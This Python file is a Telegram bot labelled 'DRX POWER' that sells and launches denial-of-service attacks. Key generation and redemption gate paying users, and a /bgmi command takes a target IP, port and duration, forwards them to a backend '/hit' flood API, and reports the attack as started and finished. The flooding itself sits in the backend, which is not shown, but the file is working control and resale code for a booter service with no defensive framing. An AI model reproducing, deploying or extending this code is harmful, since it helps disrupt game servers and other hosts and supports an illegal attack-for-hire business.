import telebot
import json
import requests
import datetime
import os
import time
import psutil
import socket
import threading

# Load Config
if os.path.exists('config.json'):
    with open('config.json') as f:
        config = json.load(f)
else:
    print("Error: config.json file nahi mili!")
    exit()

bot = telebot.TeleBot(config['token'])

# IMPORTANT
# AUTO DETECT RENDER URL
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL")

if RENDER_URL:
    API_URL = f"{RENDER_URL}/hit"
else:
    API_URL = "http://127.0.0.1:8080/hit"

AUTH_TOKEN = "DRX_POWER_ULTRA_V4"

# Database files
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"


def load_data(file):
    if os.path.exists(file):
        with open(file, 'r') as f:
            return json.load(f)
    return {}


def save_data(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)


# Commands Logic

@bot.message_handler(commands=['start'])
def welcome(m):
    bot.reply_to(
        m,
        "🔥 DRX POWER Bot Active\n\nUse /help to see commands."
    )


@bot.message_handler(commands=['help'])
def help_cmd(m):

    help_text = """
🚀 Available Commands:

/bgmi <ip> <port> <time>
/redeem <key>
/myinfo
/status

👑 Admin:
/genkey 1d
"""

    bot.reply_to(m, help_text)


@bot.message_handler(commands=['genkey'])
def genkey(m):

    if str(m.from_user.id) != str(config['admin']):
        return bot.reply_to(m, "❌ Admin only command.")

    args = m.text.split()

    if len(args) < 2:
        return bot.reply_to(m, "Usage: /genkey 1h, 1d, 1w")

    duration = args[1]

    key = "DRX-" + os.urandom(3).hex().upper()

    keys = load_data(KEYS_FILE)

    keys[key] = duration

    save_data(KEYS_FILE, keys)

    bot.reply_to(
        m,
        f"🔑 Key Generated:\n\n{key}\n\n⏳ Duration: {duration}"
    )


@bot.message_handler(commands=['redeem'])
def redeem(m):

    args = m.text.split()

    if len(args) < 2:
        return bot.reply_to(m, "Usage: /redeem DRX-XXXX")

    user_key = args[1]

    keys = load_data(KEYS_FILE)

    if user_key in keys:

        duration = keys[user_key]

        users = load_data(USERS_FILE)

        users[str(m.from_user.id)] = {
            "plan": duration,
            "active": True
        }

        save_data(USERS_FILE, users)

        del keys[user_key]

        save_data(KEYS_FILE, keys)

        bot.reply_to(
            m,
            f"✅ Redeemed Successfully!\nPlan: {duration}"
        )

    else:
        bot.reply_to(m, "❌ Invalid or Expired Key.")


@bot.message_handler(commands=['bgmi'])
def attack(m):

    users = load_data(USERS_FILE)

    user_id = str(m.from_user.id)

    if user_id not in users or not users[user_id].get('active'):

        return bot.reply_to(
            m,
            "❌ ACCESS DENIED!\nNo active plan found."
        )

    args = m.text.split()

    if len(args) != 4:
        return bot.reply_to(
            m,
            "❌ Format:\n/bgmi <IP> <PORT> <TIME>"
        )

    ip = args[1]
    port = args[2]
    attack_time = args[3]

    try:

        response = requests.get(
            f"{API_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}",
            timeout=15
        )

        data = response.json()

        if response.status_code == 200:

            bot.reply_to(
                m,
                f"🚀 ATTACK STARTED!\n\n"
                f"🎯 Target: {ip}:{port}\n"
                f"🕒 Time: {attack_time}s\n"
                f"📶 API: ONLINE ✅"
            )

            def send_finish():

                bot.send_message(
                    m.chat.id,
                    f"✅ ATTACK FINISHED\n\n🎯 {ip}:{port}"
                )

            threading.Timer(
                int(attack_time),
                send_finish
            ).start()

        else:

            bot.reply_to(
                m,
                f"❌ API ERROR\n\n{data}"
            )

    except Exception as e:

        bot.reply_to(
            m,
            f"❌ VPS/API OFFLINE\n\n{str(e)}"
        )


@bot.message_handler(commands=['myinfo'])
def myinfo(m):

    users = load_data(USERS_FILE)

    user_id = str(m.from_user.id)

    if user_id in users:

        bot.reply_to(
            m,
            f"👤 User Info\n\n"
            f"Plan: {users[user_id]['plan']}\n"
            f"Status: Active ✅"
        )

    else:

        bot.reply_to(
            m,
            "❌ No active plan found."
        )


@bot.message_handler(commands=['status'])
def status(m):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.settimeout(2)

    try:

        s.connect(('127.0.0.1', 8080))

        api_status = "Online 🟢"

        s.close()

    except:

        api_status = "Offline 🔴"

    cpu_usage = psutil.cpu_percent(interval=1)

    ram_usage = psutil.virtual_memory().percent

    status_text = (
        f"📊 DRX STATUS\n\n"
        f"🤖 Bot: Active ✅\n"
        f"🔌 API: {api_status}\n"
        f"🖥 CPU: {cpu_usage}%\n"
        f"💾 RAM: {ram_usage}%"
    )

    bot.reply_to(m, status_text)


# =========================
# START BOT
# =========================

def start_polling():

    while True:

        try:

            print("Bot Started...")

            bot.infinity_polling(
                timeout=60,
                long_polling_timeout=60
            )

        except Exception as e:

            print(f"Polling Error: {e}")

            time.sleep(5)


if __name__ == "__main__":

    start_polling()
